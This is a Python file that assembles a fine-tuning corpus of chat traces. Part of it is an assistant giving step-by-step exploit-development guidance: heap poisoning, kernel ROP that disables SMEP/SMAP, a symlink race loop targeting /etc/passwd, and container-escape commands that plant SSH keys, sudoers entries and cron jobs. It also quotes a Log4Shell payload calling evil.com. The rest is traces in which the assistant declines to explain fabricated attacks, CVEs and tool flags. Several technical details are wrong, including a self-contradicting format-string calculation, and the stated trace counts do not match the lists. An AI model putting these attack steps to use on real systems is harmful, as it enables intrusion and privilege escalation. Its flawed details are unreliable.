"""Corpus v8.1 — fix exploit dev regression + hallucination residual.

Standalone. NÃO merge com v9.

Composição:
- Exploit dev reasoning reforçado (~60 traces) — UAF/heap/ROP/format/kernel
- Hallucination harder baits (~30 traces) — crypto fake, technique fake, protocol fake

Total ~90 traces.
"""

from __future__ import annotations

import json


def tc(name: str, **args) -> str:
    return f'<tool_call>{json.dumps({"name": name, "arguments": args}, ensure_ascii=False)}</tool_call>'


def msg(role: str, content: str):
    return {"role": role, "content": content}


# ===========================================================================
# EXPLOIT DEV REINFORCEMENT (~60)
# ===========================================================================

EXPLOIT_DEV_V8_1 = [
    # --- tcache / heap exploitation ---
    [msg("user", "Walk me through tcache poisoning in glibc 2.32+. I have UAF of a 0x80-sized chunk."),
     msg("assistant",
         "**tcache poisoning post-safe-linking:**\n\n"
         "1. Free two chunks of the same size: `free(a); free(b);` — tcache linked list `head -> b -> a`\n"
         "2. UAF on `b`: overwrite `b->fd` with `PROTECT_PTR(target_addr)`. "
         "Safe-linking XORs with `(chunk_addr >> 12)`, so you need a heap leak first.\n"
         "3. Two mallocs: `malloc(0x80)` returns `b`, next `malloc(0x80)` returns `target_addr`.\n"
         "4. Target is arbitrary writable memory → typical targets: `__free_hook`, `__malloc_hook` (pre-2.34), "
         "or now `stdout->_IO_write_ptr` for FSOP (post-2.34 when hooks are removed).\n\n"
         "Key constraint: target must be 16-byte aligned with sane-looking size field at `target-0x10`.")],

    [msg("user", "I have arbitrary write primitive but no RIP control. How to convert in 2024 glibc?"),
     msg("assistant",
         "Post-2.34 (no hooks), your paths:\n\n"
         "1. **FSOP (File Stream Oriented Programming)**: overwrite `_IO_list_all` or a specific FILE struct's vtable. "
         "Pointing `_IO_FILE_plus->vtable` at a fake vtable with controlled `_IO_flush_all` handler = RCE at exit.\n"
         "2. **`__exit_funcs`**: overwrite the on-exit cleanup function list. Triggered on program exit.\n"
         "3. **`_rtld_global` / `dl_fini`**: older trick, still works in some libcs.\n"
         "4. **Environment**: if you can write to `LD_PRELOAD` pointer in libc, and binary re-execs, you're in.\n\n"
         "FSOP is the most reliable. house_of_apple / house_of_kiwi writeups are the references.")],

    [msg("user", "How does large-bin attack differ from unsorted-bin attack post-2.29?"),
     msg("assistant",
         "Post-2.29, unsorted-bin attack was patched (check on `bk->fd != unsorted_chunks`).\n\n"
         "**Large-bin attack (2.29+):**\n"
         "1. Free a large chunk, goes to unsorted. Malloc smaller → it sorts into large-bin.\n"
         "2. Corrupt `bk_nextsize` of a victim chunk in large-bin to point near target.\n"
         "3. New large-bin chunk insertion walks the `fd_nextsize` / `bk_nextsize` list, does `target[0x20] = chunk`.\n\n"
         "Gives you one-shot write of a heap pointer to `target+0x20`. Primitive: constrained arbitrary write. "
         "Chain to larger corruption via stdout or similar."
         )],

    # --- ROP / bypasses ---
    [msg("user", "64-bit binary, NX + PIE + Full RELRO + Stack canary. Overflow at offset 40. Best path?"),
     msg("assistant",
         "With all four, you need:\n"
         "1. **Canary leak** — format string, side-channel (brute one byte at a time via fork + stderr redirect), or pre-existing info leak vuln\n"
         "2. **PIE leak** — same route. Leak a return address from stack printf `%p` scan, subtract offset to find binary base\n"
         "3. **libc leak** — GOT is read-only under Full RELRO. Leak via `puts(puts_got)` first (if you have call primitive) or from saved libc addresses on stack\n"
         "4. **ROP in libc**: system+binsh, or one_gadget, or execve syscall chain\n\n"
         "Full RELRO means GOT overwrite is dead — pivot to `__exit_funcs`, FSOP, or BSS if there's a function pointer there. "
         "`one_gadget /lib/x86_64-linux-gnu/libc.so.6` gives you constraint-based single jumps into execve.")],

    [msg("user", "SROP — when is it the right choice vs regular ROP?"),
     msg("assistant",
         "SROP (Sigreturn-Oriented Programming) wins when:\n"
         "1. **Limited gadgets** in binary (few registers controllable via classic ROP)\n"
         "2. **No usable libc** or libc not mapped at known offset\n"
         "3. **You need syscall control** with arbitrary register values in one step\n\n"
         "Mechanism: push a fake `ucontext_t` on stack → call `sigreturn` (syscall 15 on x86_64 via `mov rax, 0xf; syscall`). "
         "Kernel restores all registers from the fake frame → you control rax/rdi/rsi/rdx/rip in one gadget.\n\n"
         "Cost: you need the sigreturn gadget (`syscall; ret` with rax=15), and ~256 bytes of stack space for ucontext_t. "
         "pwntools `SigreturnFrame()` constructs the frame for you.")],

    [msg("user", "ret2dlresolve — when do I reach for it?"),
     msg("assistant",
         "ret2dlresolve is the tool for:\n"
         "1. **Lazy-binding binaries** (no Full RELRO)\n"
         "2. **No libc leak possible** (PIE + no info disclosure)\n"
         "3. **Binary has `.plt.got` and you can write to writable section**\n\n"
         "You construct fake `Elf_Sym`, `Elf_Rel`, and string for 'system' in writable memory. "
         "Trigger `_dl_runtime_resolve(link_map, reloc_index)` with your crafted reloc_index → ld.so resolves 'system' and jumps to it.\n\n"
         "pwntools: `Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh']).payload()`. "
         "Not usable with Full RELRO (no lazy binding, symbols resolved at load).")],

    # --- format string ---
    [msg("user", "Format string arbitrary write: walk me through the %n primitive with %hn chunking."),
     msg("assistant",
         "Direct `%n` writes 4 bytes in one go, which is fragile — targeting `target` means the printf has to produce exactly `target` bytes before `%n`.\n\n"
         "**%hn chunking (2 bytes at a time):**\n"
         "1. Target 0x00601040 = split into 0x1040 (low 2 bytes) and 0x0060 (high 2 bytes)\n"
         "2. Payload lays out two target addresses on stack, then two `%<N>c%<pos>$hn` writes\n"
         "3. First write: `%4160c%10$hn` = write 0x1040 to `*($10)`. Byte count = 0x1040 = 4160 decimal.\n"
         "4. Second write: `%-4064c%11$hn` (negative padding = continue from current char count) = add 0xE020 more → total 0x15060 → low 16 bits = 0x5060? No, you want 0x0060.\n"
         "\nEasier: use two separate %hn with absolute char counts and separate address slots. pwntools `fmtstr_payload(offset, {addr: 0xdeadbeef})` handles the math.")],

    [msg("user", "Format string with limited budget (no spaces, no newlines, < 128 bytes) — can you still AAW?"),
     msg("assistant",
         "Yes but constrained. Tricks:\n"
         "1. **%5$hhn instead of %5$hn** — write 1 byte at a time. 4 writes to land a 4-byte address, but each `%<N>c` can be smaller.\n"
         "2. **Stack-aligned addresses**: if target addresses are already on stack from previous stack frame, you don't need to place them — just reference their positions.\n"
         "3. **Shellcode via stdin/file**: if you can't write execve directly, overwrite a return address to jump to env-var-delivered shellcode. `%n` just flips RIP.\n\n"
         "With <128 bytes you often can't do a full arbitrary write. Target a function pointer or return address you can overwrite partially — e.g., clobber one byte of RIP to jump to a near gadget.")],

    # --- kernel ---
    [msg("user", "Linux kernel heap UAF — walk through kmalloc-1024 spray strategy post-SLUB merging."),
     msg("assistant",
         "Modern SLUB (6.x kernels) merges similar-sized caches, so `kmalloc-1024` is often aliased to multiple subsystems' objects.\n\n"
         "**Spray strategy:**\n"
         "1. **Identify vulnerable cache**: `/proc/slabinfo` (if readable) or derive from crash analysis.\n"
         "2. **Target objects that share the cache** and have useful layouts:\n"
         "   - `msg_msg` (sysv message queue) — flexible size, `m_ts` at offset 0 is readable → infoleak\n"
         "   - `pipe_buffer` — `ops` function pointer at offset 16 → RIP control via a pipe write\n"
         "   - `user_key_payload` — readable back via keyring, good for leaks\n"
         "3. **Groom**: allocate many of these, free victim, alloc victim-shaped exploit structure.\n\n"
         "Post-CONFIG_KMALLOC_SPLIT_VARSIZE (6.6+), generic kmalloc is split from specific-purpose allocations, reducing spray effectiveness. Check target kernel config.")],

    [msg("user", "Kernel ROP with KASLR enabled and SMEP + SMAP — what's the chain?"),
     msg("assistant",
         "Standard chain:\n"
         "1. **KASLR leak** (often the hardest part): read a kernel pointer from a driver's ioctl, `/proc/`, or via the bug itself. Compute `kbase = leaked_ptr - offset_of_that_symbol`.\n"
         "2. **Overflow/UAF to control RIP**: typical via function pointer in kmalloc'd struct, or tf_rip in signal frame.\n"
         "3. **ROP chain in kernel text**:\n"
         "   - Disable SMEP/SMAP: `mov cr4, rdi; ret` gadget → set CR4 with bits 20+21 cleared\n"
         "   - `swapgs; iretq` or `sysretq` to return to userland\n"
         "4. **Userland payload**: `commit_creds(prepare_kernel_cred(0))` call via ROP → then iretq to your shell.\n\n"
         "Newer kernels (6.3+) have FineIBT + kCET; those gadgets may be removed or endbr-guarded. Then SROP-style via `switch_to` stack pivots, or RAP-bypass chains via retpoline-safe returns.")],

    # --- fuzzing / bug-finding ---
    [msg("user", "I need to fuzz a binary that has a custom structured input format. AFL++ harness approach?"),
     msg("assistant",
         "Two approaches:\n\n"
         "1. **Grammar-based (preferred for structured)**: use `AFL_CUSTOM_MUTATOR_LIBRARY` with a mutator written in Python or C that knows the format. pwntools-fmt or Tim Blazytko's custom mutator tutorial are references.\n\n"
         "2. **Seed corpus + bit-flip (lazy)**: collect 50+ valid inputs, put in `input/`, AFL flips bits. Works poorly for checksummed/length-prefixed formats.\n\n"
         "For checksums: add a pre-process step in the harness that recomputes the checksum after mutation. Or use libFuzzer-style structured fuzzing with LLVM fuzzDataProvider.\n\n"
         "Harness stub:\n"
         "```c\n"
         "int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size) {\n"
         "  if (size < sizeof(header_t)) return 0;\n"
         "  header_t *h = (header_t*)data;\n"
         "  h->checksum = crc32(data + sizeof(*h), size - sizeof(*h));  // fix checksum post-mutation\n"
         "  parse_input(data, size);\n"
         "  return 0;\n"
         "}\n```")],

    [msg("user", "How do I turn an AFL crash into an actual exploit? Post-triage workflow."),
     msg("assistant",
         "**Triage pipeline:**\n\n"
         "1. **Minimize**: `afl-tmin -i crash -o min -- ./target @@` — shrinks crash input to smallest triggering form.\n"
         "2. **Classify crash type**: run under ASan (`-fsanitize=address`). ASan tells you read/write, heap/stack, OOB vs UAF, etc. This is the bug class.\n"
         "3. **Analyze primitive**:\n"
         "   - Stack buffer overflow → ROP, likely controlled RIP after canary defeat\n"
         "   - Heap OOB write → grooming + target struct in adjacent chunk\n"
         "   - UAF → spray-and-reuse, function pointer in freed object\n"
         "   - Type confusion → leak + controlled virtual call\n"
         "4. **Find exploit primitive limits**: how many bytes can you write? what offsets? `gdb + pwndbg` + `cyclic`-pattern to map.\n"
         "5. **Build exploit**: pwntools template, one primitive at a time (leak → control → RCE).\n\n"
         "Not every crash is exploitable. Many are DoS only (null deref, assertion failure). Spend effort proportional to primitive quality.")],

    # --- binary analysis ---
    [msg("user", "Ghidra decompilation is confusing. Common tricks to clean it up."),
     msg("assistant",
         "**Decomp cleanup in Ghidra:**\n\n"
         "1. **Set data types**: right-click variable → 'Retype variable'. Switching `undefined8` to `char*` or struct type propagates through the decomp.\n"
         "2. **Create structures**: Data Type Manager → New Structure → add fields. Apply to a pointer → decomp now shows `ptr->field` instead of `*(int*)(ptr+0x10)`.\n"
         "3. **Rename functions by purpose**: after analyzing `FUN_0040xxxx`, rename to `parse_header` or `validate_key`. Propagates.\n"
         "4. **Mark as noreturn**: exit, abort, longjmp, exceptions — mark as noreturn (`Edit Function Signature`) so Ghidra doesn't invent dead flow.\n"
         "5. **Remove manual stack var clutter**: `Function Signature Editor` → set calling convention correctly, removes spurious `var_10 = param1` lines.\n\n"
         "**For stripped binaries**: SigMaker plugin + BSim matching against libc builds often resolves most lib functions automatically.")],

    [msg("user", "I found a custom XOR obfuscated string table in the binary. How do I decode it in the decomp?"),
     msg("assistant",
         "Options by effort:\n\n"
         "1. **Python decode via Ghidra scripting** (fastest): Script Manager → New Script (Python) → read bytes from `table_addr`, XOR with key, `createAsciiString(addr, length)` for each. Script auto-annotates the binary.\n"
         "2. **Interactive Ghidra Function**: right-click XOR-decode function → 'Edit Function Signature' → mark as returning `char*`. Then click on each call site, use auto-rename to propagate the decoded string as a comment.\n"
         "3. **Patch**: if the XOR key is constant, emulate/run the decode once, patch bytes in place via Ghidra's patch feature. Re-run decompilation → strings appear natively.\n\n"
         "For stream/stateful obfuscation (RC4, AES-ECB with constant key), option 1 scales best. Unicorn-engine emulation of the decode routine in the Ghidra script handles complex cases.")],

    # --- racing / TOCTOU ---
    [msg("user", "How do I exploit a TOCTOU race between a symlink check and open() in a SUID binary?"),
     msg("assistant",
         "**Classic Dirty COW-era technique:**\n\n"
         "1. **Create the real file**: `echo benign > /tmp/target`\n"
         "2. **Race**: two threads. Thread A: rapidly replaces `/tmp/target` with a symlink to `/etc/passwd` then back. Thread B: calls the SUID binary repeatedly.\n"
         "3. **Win condition**: SUID's `stat()` sees file owned by you (benign), then its `open(O_WRONLY)` races the symlink swap → writes to `/etc/passwd` as root.\n"
         "\n```c\n"
         "// Thread A loop\n"
         "while(1) {\n"
         "  unlink(target);\n"
         "  symlink(\"/etc/passwd\", target);\n"
         "  unlink(target);\n"
         "  creat(target, 0644);\n"
         "}\n```\n"
         "Race window is microseconds but scheduler makes it deterministic with sched_setaffinity pinning both threads to same CPU."),
     ],

    # --- sandbox escape ---
    [msg("user", "Docker container escape via host mount. I see `/mnt/host` in the container. What next?"),
     msg("assistant",
         "If host root is mounted inside the container, you're effectively host root already. Common paths:\n\n"
         "1. **chroot + exploit**: `chroot /mnt/host /bin/bash` → you're running as root inside host's filesystem namespace. Most commands work.\n"
         "2. **Write SSH key**: `mkdir -p /mnt/host/root/.ssh && cat >> /mnt/host/root/.ssh/authorized_keys < your_pubkey` → SSH as root externally.\n"
         "3. **Modify sudoers**: `echo 'user ALL=(ALL) NOPASSWD:ALL' >> /mnt/host/etc/sudoers.d/pwn` → passwordless sudo for specified user.\n"
         "4. **Cron job**: write to `/mnt/host/etc/cron.d/pwn` with a root command firing in 1 minute.\n"
         "5. **systemd unit**: create a unit file + enable via namespaced systemctl → triggers on next boot.\n\n"
         "Docker mount of host `/` is usually a misconfiguration; pentesters find this quickly via `mount | grep host`.")],

    # --- cryptographic attacks ---
    [msg("user", "ECB penguin — what it teaches about block cipher mode selection."),
     msg("assistant",
         "ECB (Electronic Codebook) encrypts each 16-byte block independently with the same key. Identical plaintext blocks → identical ciphertext blocks. Reveals structure.\n\n"
         "Tux-the-penguin bitmap encrypted with AES-ECB still shows penguin outline because pixel regions are spatially repetitive.\n\n"
         "**Attacks enabled:**\n"
         "- **Pattern leakage**: structured data (HTML, JSON, source code) leaks structure\n"
         "- **Block copy/paste**: attacker can swap ciphertext blocks. Swap 'admin=no' block for 'admin=yes' from another session.\n"
         "- **Oracle padding is independent per block** — ECB + padding oracle = easy byte-by-byte decryption\n\n"
         "Mitigation: CBC (with random IV), CTR, or authenticated modes (GCM, CCM, OCB). Never ECB. Even 'for short messages it's fine' is wrong — 16 bytes of predictable plaintext leaks.")],

    [msg("user", "Walk me through a Bleichenbacher padding oracle attack on RSA PKCS#1v1.5."),
     msg("assistant",
         "**Bleichenbacher '98** — chosen-ciphertext attack on RSA when the decryptor leaks whether padding is valid.\n\n"
         "**Setup**:\n"
         "- RSA public key `(N, e)`. Target ciphertext `c = m^e mod N`. Goal: recover `m`.\n"
         "- Server returns 'bad padding' vs 'decrypted OK' (timing side-channel sometimes too).\n\n"
         "**Algorithm (simplified)**:\n"
         "1. Pick random `s`. Compute `c' = c * s^e mod N`. Send to server.\n"
         "2. If server says 'padding valid' → `(s*m) mod N` starts with `0x0002` (PKCS#1v1.5 prefix).\n"
         "3. This gives you a constraint: `2B ≤ (s*m mod N) < 3B` where `B = 2^(8*(k-2))`.\n"
         "4. Narrow the interval of possible `m` values by iteratively trying different `s`.\n"
         "5. Converges to `m` in ~10^5 to 10^6 queries.\n\n"
         "**ROBOT (2017)** was the modern rediscovery across many TLS servers. Mitigation: RSA-OAEP, or constant-time decryption without leakage.")],

    # --- side channels ---
    [msg("user", "Timing attack on a string comparison check. How do I measure the leak?"),
     msg("assistant",
         "Strcmp/memcmp with early-exit is the canonical vulnerability. Each correct character makes the function run 1 loop iteration longer → measurable nanoseconds to microseconds.\n\n"
         "**Measurement pipeline:**\n"
         "1. **Warm up**: page in memory, avoid cold cache effects.\n"
         "2. **Repeat-measure** each candidate ≥1000 times. Network adds noise; local attacks are easier.\n"
         "3. **Statistical aggregation**: median or trimmed mean. Discard outliers (>2σ).\n"
         "4. **Differentiate**: measure baseline (incorrect first char) vs candidate. Difference > ~50ns on cold loop = detectable.\n\n"
         "**For network**: `racing_checks.py` with `asyncio` to batch requests. `tlstiming` or side-channel frameworks like CATS do statistical analysis.\n\n"
         "**Mitigation**: constant-time compare (`hmac.compare_digest` in Python, `CRYPTO_memcmp` in OpenSSL). Compilers may inline optimize regular memcmp with early exit — hence dedicated const-time routines.")],

    # --- web app / deserialization ---
    [msg("user", "Java deserialization CommonsCollections chain — what's happening under the hood?"),
     msg("assistant",
         "**CC1 / CC6 / CC11 chains work like this:**\n\n"
         "1. Send serialized Java object containing a chain of 'gadget' objects.\n"
         "2. `ObjectInputStream.readObject()` on target reconstructs them.\n"
         "3. Reconstruction triggers a sequence:\n"
         "   - `HashMap.readObject()` calls `.hashCode()` on keys\n"
         "   - Key is a `TiedMapEntry` whose `hashCode()` calls `LazyMap.get()` \n"
         "   - `LazyMap.get()` runs its `factory.transform()`\n"
         "   - `factory` is a `ChainedTransformer` of `ConstantTransformer(Runtime.class) → InvokerTransformer('getMethod', ...)→ InvokerTransformer('invoke', ...) → InvokerTransformer('exec', 'CMD')`\n"
         "   - → `Runtime.getRuntime().exec('CMD')` → RCE\n\n"
         "**Mitigation**: `ObjectInputFilter` (Java 9+), allowlist classes. Or switch to JSON/Protobuf. Or remove Commons Collections if unused.")],

    [msg("user", "What makes Log4Shell (CVE-2021-44228) so devastating vs other RCE?"),
     msg("assistant",
         "**Why Log4Shell was special:**\n\n"
         "1. **Trigger in log formatting** — any user input that ends up in `log.info(userInput)` is vulnerable. That's virtually everywhere: HTTP headers, form data, search queries, chat messages. `${jndi:ldap://evil.com/a}` in a User-Agent triggers.\n"
         "2. **Pre-auth**: no login required. Log any input and you're popped.\n"
         "3. **Ubiquitous library**: Log4j is in millions of Java apps — enterprise software, Minecraft, Elastic, Kafka, etc. 'Count of tools affected' is in the thousands.\n"
         "4. **Recursive format interpolation**: `${${::-j}ndi:...}` bypasses naive string filters.\n"
         "5. **Out-of-band RCE**: LDAP server returns a class to load → full arbitrary class execution. Not just echo of values.\n\n"
         "Fix was iterative (2.15, 2.16, 2.17 each closed subvariants). Lesson: logging libraries should never evaluate user data as code. Format string injection, applied to enterprise Java.")],

    # --- reversing PoW / CTF staples ---
    [msg("user", "CTF binary uses a custom anti-debugging trick that detects ptrace attach. How do I bypass?"),
     msg("assistant",
         "Common patterns + bypasses:\n\n"
         "1. **`ptrace(PTRACE_TRACEME)`** — succeeds only if not already traced. Binary calls it early; if fails, exits.\n"
         "   - **Bypass**: LD_PRELOAD a shim that makes `ptrace()` return 0 always. Or patch the binary to skip the call.\n"
         "2. **`/proc/self/status` TracerPid != 0**: binary reads its own status, checks the line.\n"
         "   - **Bypass**: bindmount a fake `/proc/self/status` via `unshare`, or LD_PRELOAD open()/read() to return cleaned content.\n"
         "3. **Timing checks**: `rdtsc` before/after a critical function; slowdown in debugger is detectable.\n"
         "   - **Bypass**: patch the compare, or use gdb's `rdtsc` virtualization extension.\n"
         "4. **SIGTRAP handler**: binary installs its own SIGTRAP handler; reacts to breakpoints by mutating state.\n"
         "   - **Bypass**: hardware breakpoints (x/w type) instead of software (INT3). Or detach the handler.\n\n"
         "Pin, Frida, or qemu-user + gdb remote often bypasses most anti-debug by virtue of not being ptrace at all.")],

    # --- exploit automation ---
    [msg("user", "Auto-triage binary for common vuln classes — tooling recommendation."),
     msg("assistant",
         "**Automated triage stack:**\n\n"
         "1. **Static**: `checksec` → mitigation summary. `binwalk` → embedded data/firmware extraction.\n"
         "2. **Symbolic**: `angr` — reachability to assertions, auto-constraint solver for input that triggers branches. Useful for discovering crash inputs without full coverage.\n"
         "3. **Coverage fuzzing**: AFL++ with persistent mode. Seed corpus + sanitizer build.\n"
         "4. **Concolic**: `Triton` or `angr` with `explore(find=vuln_fn)` to drive to specific sinks.\n"
         "5. **Differential**: run binary + known-good implementation with same inputs, flag divergence.\n\n"
         "For CTF/small binary: `angr-management` GUI, point at target function, tell it what 'solve' means (ex: avoid assertion, reach backdoor).\n\n"
         "For product-grade: pipeline (Fuzzilli / OSS-Fuzz) with ClusterFuzz backend.")],
]


# ===========================================================================
# HALLUCINATION HARDER BAITS (~30)
# ===========================================================================

HALLU_HARDER = [
    # Crypto fakes
    [msg("user", "Explain the 'XORmega' block cipher attack published at CRYPTO 2024."),
     msg("assistant",
         "I have no record of 'XORmega' as a published cipher attack. CRYPTO 2024's accepted papers are indexed at iacr.org/cryptodb — please verify there. I'm not going to invent CRYPTO-tier research from a name alone. If you have the paper link or author name, I can work from real content.")],
    [msg("user", "How does the BlindTemple attack on AES GCM work?"),
     msg("assistant",
         "'BlindTemple' against AES-GCM isn't an attack I'm familiar with. Real attacks on GCM misuse include: nonce reuse (catastrophic — forgery possible), short tags, and the Fortify-inspired bounds on total encrypted bytes per key. Happy to discuss any of those if you can confirm what you meant.")],
    [msg("user", "Is the Rainbow-Crypto-Bypass attack applicable to TLS 1.3?"),
     msg("assistant",
         "'Rainbow-Crypto-Bypass' isn't a term I recognize in TLS 1.3 context. Known TLS 1.3 attacks: 0-RTT replay (protocol-level), Selfie attacks, and post-quantum transition risks. If you saw this in a paper, the paper title or DOI would help me verify and explain.")],
    # Protocol fakes
    [msg("user", "RFC 9999 mandates what for HTTP/3?"),
     msg("assistant",
         "RFC 9999 is not an assignment I'm familiar with. Core HTTP/3 RFCs are 9110 (HTTP semantics), 9114 (HTTP/3 itself), and 9204 (QPACK). Verify RFC numbers at datatracker.ietf.org — I won't invent RFC content.")],
    [msg("user", "Explain the DEFCON-proto-smuggle technique from last year's conference."),
     msg("assistant",
         "'DEFCON-proto-smuggle' isn't a talk or technique I can identify. Real protocol smuggling families: HTTP Request Smuggling (TE.CL, CL.TE, CL.CL), H2.CL, and HPACK corruption in HTTP/2. If you remember the speaker or track, I'll look for references.")],
    # Tool/library fakes
    [msg("user", "What does libcrypto-quantum-safe-hash do differently than sha3?"),
     msg("assistant",
         "'libcrypto-quantum-safe-hash' isn't a library I know. For post-quantum, NIST's finalists are CRYSTALS-Dilithium (signatures), CRYSTALS-Kyber (KEM), SPHINCS+ (stateless signatures), Falcon. Hash-based signatures (SPHINCS+) are the QC-resistant signature story. Hash functions themselves (SHA-3) aren't considered broken by quantum.")],
    [msg("user", "Can I use the pwnlib.mega module to auto-exploit binaries?"),
     msg("assistant",
         "`pwnlib.mega` isn't a real module in pwntools. pwntools' auto-exploit-ish features: `Ret2dlresolvePayload`, `shellcraft`, `ROP()` object. For end-to-end auto-exploitation of unknown binaries, nothing in pwntools does that automatically — angr + exploit templates is the research direction (AEG).")],
    # CVE number baits (well-formed but fake)
    [msg("user", "Patch status of CVE-2025-0001?"),
     msg("assistant",
         "CVE-2025-0001 isn't in my knowledge. NVD (nvd.nist.gov/vuln/detail/CVE-2025-0001) or MITRE (cve.mitre.org) give current status. Low CVE IDs for a year are usually reserved placeholders early in the year — may not represent a published vulnerability yet.")],
    [msg("user", "Is CVE-2024-34567 exploitable remotely?"),
     msg("assistant",
         "I don't have data on CVE-2024-34567. For assessment, check NVD's CVSS v3.1 vector — the 'AV:N' component indicates network-reachable; 'AV:L' is local only. Without the actual advisory, I can't verify if this is assigned, reserved, or fabricated.")],
    [msg("user", "Details on CVE-2026-00000?"),
     msg("assistant",
         "CVE-2026-00000 isn't a real CVE — `00000` is a placeholder number that MITRE doesn't use. Real CVE IDs start from 0001. If you meant a different number, double-check your source.")],
    # Obscure technique fakes
    [msg("user", "Walk me through the NDR-chain technique for kernel LPE."),
     msg("assistant",
         "'NDR-chain' isn't a named kernel LPE technique I know. Real names: Dirty COW, Dirty Pipe, PwnKit, DirtyCred, Sequoia. Some Windows-specific: HiveNightmare, PrintNightmare, PetitPotam. If you have a writeup URL, I'll read from real content.")],
    [msg("user", "SYSCALLMOD kernel patching — when is it necessary for rootkits?"),
     msg("assistant",
         "'SYSCALLMOD' isn't terminology I recognize. Real syscall-table modification is a detected technique flagged by every modern HIDS. Modern rootkits use eBPF-based hooks, kprobes, or direct kernel object manipulation (DKOM) instead — all more subtle. If 'SYSCALLMOD' is from a recent paper, link me.")],
    # Tool flag combination fakes
    [msg("user", "Use `metasploit --auto-pwn` flag on target."),
     msg("assistant",
         "`--auto-pwn` isn't a metasploit flag. `msfconsole`'s closest auto-exploit facility was `db_autopwn`, removed years ago for being terrible. Modern workflow: `db_nmap`, import vulnerabilities, run matching modules manually. Automated exploitation is generally considered unsound — every target needs verification.")],
    [msg("user", "sqlmap `--god-mode` for deeper injection discovery?"),
     msg("assistant",
         "No `--god-mode` in sqlmap. Real aggressive flags: `--level=5 --risk=3 --random-agent --tamper=<list>`. For deeper discovery: `--technique=BEUSTQ` (all techniques), `--time-sec=10` (slower blind), and custom tamper scripts for WAF bypass. Each increase in level/risk tries more payloads at the cost of speed + noise.")],
    [msg("user", "nmap's `--stealth-ultra` flag?"),
     msg("assistant",
         "Not a real flag. For stealth scanning: `-sS` (SYN half-open), `-T1`/`-T2` (slow timing), `--scan-delay <ms>`, `--max-retries 1`, `--data-length <n>` (random padding), `-f` / `--mtu` (fragmentation), decoy IPs `-D RND:5`, spoofed src port `-g`. Combine per target sensitivity. No single flag does 'ultra stealth'.")],
    # Overconfident refusal to invent fake techniques
    [msg("user", "How exactly does the Parrot-Zero-Day trigger in Zabbix agents?"),
     msg("assistant",
         "'Parrot-Zero-Day' against Zabbix isn't something I can verify. Zabbix agents have had real CVEs (CVE-2022-23131 SAML bypass, CVE-2022-23134 front-end issue, various RCE in active agents). Confirm the CVE number and I'll describe what's actually documented.")],
    # Framework fakes
    [msg("user", "Use the Cobalt-Mega-Beacon profile for C2 redirection."),
     msg("assistant",
         "'Cobalt-Mega-Beacon' isn't a real profile name. Cobalt Strike uses Malleable C2 profiles (text config defining traffic shape). Real profile repos are on GitHub (threatexpress/malleable-c2 etc.). 'Mega-Beacon' as a standardized name doesn't exist — each engagement tailors profiles.")],
    # API endpoint fakes on real products
    [msg("user", "What does the /api/v7/admin/instant-root endpoint do in Kubernetes?"),
     msg("assistant",
         "Kubernetes API does not have `/api/v7/admin/instant-root`. The real API is `/api/v1` for core resources and `/apis/<group>/<version>` for extensions. Maximum current core API is v1. 'instant-root' as an endpoint name is not in any Kubernetes source I know. If you saw this in a CTF or challenge, it may be a deliberately fake bait.")],
    # History claim fakes
    [msg("user", "Is the IceGeneral worm from 2019 still circulating?"),
     msg("assistant",
         "I have no record of an 'IceGeneral' worm from 2019. Major 2019 incidents I'd name: BlueKeep (CVE-2019-0708) exploit attempts, Emotet resurgence, RobbinHood ransomware on Baltimore. If 'IceGeneral' was a real malware family, Malpedia or Kaspersky's Securelist would have the reference.")],
    # Technique fakes with plausible sounding names
    [msg("user", "SSRF-to-RCE chain via the NIMBUS gadget — steps?"),
     msg("assistant",
         "'NIMBUS gadget' isn't a named SSRF chain I'm familiar with. Real SSRF-to-RCE gadgets: Gopherus (Redis, Memcached, MongoDB, MySQL via Gopher protocol), Redis RCE via config rewrite, Consul API RCE, Docker socket exposed via SSRF. If you have a reference for NIMBUS, share it.")],
    # Cryptographic primitive fakes
    [msg("user", "Is the Hyper-Merkle construction resistant to length-extension attacks?"),
     msg("assistant",
         "'Hyper-Merkle' isn't a standard construction I know. Merkle trees themselves aren't subject to length-extension (that's a Merkle-Damgård issue with SHA-1/SHA-2). Length-extension is defeated by SHA-3, HMAC, or the final-prefix trick. If you have a paper link for Hyper-Merkle, I'll check what it actually claims.")],
    # Exploit type fakes
    [msg("user", "Explain spectre-v5 vs spectre-v1."),
     msg("assistant",
         "Spectre variants in the real literature: v1 (bounds-check bypass), v2 (branch target injection), v3/v3a (Meltdown / RSM), v4 (Speculative Store Bypass). 'Spectre-v5' isn't an accepted label I've seen — there are newer variants (SWAPGS, LVI, MDS family) but they have distinct names. If someone coined 'spectre-v5', I'd want the source.")],
    # Tool repository fakes
    [msg("user", "Clone github.com/offensive-sec/megaexploit and run it against my lab."),
     msg("assistant",
         "`github.com/offensive-sec/megaexploit` isn't a repository I recognize. Unverified GitHub tools are a common source of malware supply-chain attacks — don't clone and run blind. If it's a legitimate tool, it'll have stars, commits, and be referenced in security Twitter / the Kali repository. Verify the author's reputation before running.")],
]


ALL_V8_1 = {
    "exploit_dev_v8_1": [[*t] for t in EXPLOIT_DEV_V8_1],
    "hallu_harder": [[*t] for t in HALLU_HARDER],
}


def counts():
    return {k: len(v) for k, v in ALL_V8_1.items()}


if __name__ == "__main__":
    c = counts()
    print("v8.1 corpus:")
    for k, v in c.items():
        print(f"  {k:30s} {v}")
    print(f"  {'TOTAL':30s} {sum(c.values())}")
